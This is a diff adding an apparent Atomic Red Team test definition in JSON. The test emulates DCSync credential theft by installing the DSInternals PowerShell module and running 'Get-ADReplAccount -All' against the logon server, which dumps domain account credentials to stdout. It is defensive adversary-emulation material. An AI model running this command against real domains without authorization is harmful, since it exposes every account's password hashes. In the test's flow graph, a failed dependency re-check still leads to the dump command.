@@ -1,0 +1,86 @@
+{
+  "id": "a0bced08-3fc5-4d8b-93b7-e8344739376e",
+  "name": "Run DSInternals Get-ADReplAccount",
+  "description": "The following Atomic will run Get-ADReplAccount from DSInternals.\nUpon successful execution, domain and credentials will appear in stdout. \n[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellarParticle.\nhttps://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "629368ed-4e62-479f-ad71-f389ea87e4be",
+      "type": "execute-command",
+      "data": {
+        "command": "Get-ADReplAccount -All -Server #{logonserver}\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ee129516-c5b7-4829-8430-e6064ec98fbf",
+      "name": "Check dependency 1/1",
+      "description": "DSInternals must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "$RequiredModule = Get-Module -Name DSInternals -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['DSInternals']) {exit 1} else {exit 0}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "8282eb90-8213-4579-84d9-287f8f34ccb2",
+      "name": "Resolve dependency 1/1",
+      "description": "DSInternals must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Install-Module -Name DSInternals -Scope CurrentUser -Force\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "1f718dac-8750-4d30-93fe-c1d71625e9e0",
+      "name": "Re-check dependency 1/1",
+      "description": "DSInternals must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "$RequiredModule = Get-Module -Name DSInternals -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['DSInternals']) {exit 1} else {exit 0}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "ee129516-c5b7-4829-8430-e6064ec98fbf",
+      "p": "on-success",
+      "o": "629368ed-4e62-479f-ad71-f389ea87e4be"
+    },
+    {
+      "s": "ee129516-c5b7-4829-8430-e6064ec98fbf",
+      "p": "on-failure",
+      "o": "8282eb90-8213-4579-84d9-287f8f34ccb2"
+    },
+    {
+      "s": "8282eb90-8213-4579-84d9-287f8f34ccb2",
+      "p": "on-success",
+      "o": "1f718dac-8750-4d30-93fe-c1d71625e9e0"
+    },
+    {
+      "s": "1f718dac-8750-4d30-93fe-c1d71625e9e0",
+      "p": "on-failure",
+      "o": "629368ed-4e62-479f-ad71-f389ea87e4be"
+    }
+  ],
+  "tags": [
+    "T1003.006",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "logonserver",
+      "type": "string",
+      "description": "ComputerName argument default %logonserver%",
+      "value": "$ENV:logonserver.TrimStart(\"\\\")"
+    }
+  ]
+}
